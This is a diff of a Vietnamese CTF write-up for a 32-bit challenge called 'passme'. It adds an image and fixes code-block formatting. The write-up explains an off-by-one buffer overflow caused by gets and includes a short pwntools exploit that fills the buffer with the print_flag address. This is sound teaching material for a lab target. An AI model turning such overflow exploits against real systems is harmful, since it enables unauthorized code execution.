@@ -68,11 +68,15 @@ p.interactive()
 # passme
 <details>
  <summary> passme </summary>
+ 
+ ![image](https://user-images.githubusercontent.com/111769169/219850565-ca85ea7b-1530-46c9-952b-f4cf4fc77b69.png)
+ 
   ban đầu ta nghĩ nó sẽ so sánh 17.022023 với chuỗi ta nhập vào  
   tuy nhiên 17.022023 là long double còn trong file 32bit thì chỉ là float  
   đến đây em được hint là lỗi off-by-one offset là 68 và 1 byte null do hàm gets để lại nên địa chỉ ebp bị thay đổi và nhảy lung tung (giống dạng $rbp)  
   do là nhảy lung tung, có thể nhảy vào giữ payload nên ta có thể để payload toàn là ret về print_flag để tăng cơ hội nhảy vào print_flag  
- ```python3
+
+```python3
  from pwn import *
 exe = ELF("./passme", checksec = False)
 
@@ -81,5 +85,6 @@ payload = p32(exe.sym['print_flag']) *  17
 p.sendafter(b'name: \n', payload)
 
 p.interactive()
- ```
+```
+ 
 </detail>
